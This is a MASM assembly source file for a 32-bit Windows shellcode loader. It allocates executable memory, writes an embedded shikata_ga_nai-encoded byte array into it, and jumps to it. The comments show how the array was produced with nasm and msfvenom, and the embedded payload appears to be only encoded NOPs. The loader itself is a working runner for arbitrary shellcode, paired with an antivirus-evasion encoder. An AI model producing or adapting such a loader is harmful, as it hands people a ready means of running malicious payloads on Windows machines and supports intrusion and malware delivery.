; windows_loader32bits_shikataganai.asm

.model flat, stdcall

VirtualAlloc PROTO :DWORD,:DWORD,:DWORD,:DWORD
GetCurrentProcess PROTO STDCALL
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD

.data
    ; nasm nop.asm -o nop.bin
    ; xxd -p nop.bin
    ; cat nop.bin | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f masm
    shellcode DB 0dah,0d0h,0beh,57h,0b8h,0feh,0a5h,0d9h
DB 74h,24h,0f4h,5ah,33h,0c9h,0b1h,04h
DB 83h,0eah,0fch,31h,72h,13h,03h,25h
DB 0abh,1ch,50h,59h,5bh,70h,0bh,0c9h
DB 0cch,0e1h,0bch,79h,7ch,91h,2dh
    hProcess    DD ?
    baseAddr    DD ?

.code
Start PROC
    PUSH    40h ; PAGE_EXECUTE_READWRITE
    PUSH    1000h ; MEM_COMMIT
    PUSH    100h
    PUSH    0
    CALL    VirtualAlloc
    MOV     [baseAddr], eax

    CALL    GetCurrentProcess
    MOV     [hProcess], eax

    PUSH    0
    PUSH    SIZEOF shellcode
    PUSH    OFFSET shellcode
    PUSH    baseAddr
    PUSH    hProcess
    CALL    WriteProcessMemory

    CALL    baseAddr

Start ENDP
END